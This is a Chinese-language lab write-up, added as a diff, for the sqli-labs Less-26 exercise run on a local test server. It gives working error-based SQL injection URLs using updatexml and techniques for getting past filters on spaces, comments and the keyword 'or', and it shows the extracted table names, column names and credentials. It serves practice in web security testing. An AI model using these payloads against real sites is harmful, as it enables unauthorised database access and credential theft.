@@ -1,0 +1,41 @@
+http://10.0.2.15/sqli/Less-26/?id=1'
+报错' '1'' LIMIT 0,1 '
+
+故推测sql:
+select 字段名 from 表名 where id = '输入的id' limit 0,1;
+（这里有一个小问题，url为http://10.0.2.15/sqli/Less-26/?id=1\时，并不报错，在此推测是代码将转移字符\过滤了）
+http://10.0.2.15/sqli/Less-26/?id=1'--+
+还是报错，我在此推测代码将注释符也过滤了
+http://10.0.2.15/sqli/Less-26/?id=1'||'1' = '1
+正常登录
+
+1.字段数
+在网上查的绕过去除空格的策略：
+编码：采用hex、urlencode编码
+空格                           %a0（%20表示半角空格，代码中常用;%a0表示不间断空格，主要用于office，让一个单词在结尾处不会换行显示）
+TAB键（水平）        %09
+新建一行                   %0a
+return功能               %0d
+TAB键（垂直）        %0b
+
+但实际操作起来都不行呢
+上网上查了一下，有说是因为window下apache解析的问题，可我这不是windows系统啊…
+后来使用（）来绕过，这次成功了
+
+2.数据库名
+http://10.0.2.15/sqli/Less-26/?id=0'+||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||'1'='1
+
+3.表名
+http://10.0.2.15/sqli/Less-26/?id=0'+||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security')),0x7e),1)||'1'='1
+注意本题对or也有过滤，故information写成infoorrmation
+显示：'~users,uagents,emails,referers~'
+
+4.字段名
+http://10.0.2.15/sqli/Less-26/?id=0'+||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='users')),0x7e),1)||'1'='1
+显示：'~id,username,password,USER,CURRE'
+
+5.字段值
+http://10.0.2.15/sqli/Less-26/?id=0'+||updatexml(1,concat(0x7e,(select(group_concat(username,0x3a,passwoorrd))from(users)),0x7e),1)||'1'='1
+显示：'~Dumb:1,Angelina:1,Dummy:1,secur'
+
+（其实有个问题，显示不全，但加limit报错，不知道该怎么解决）
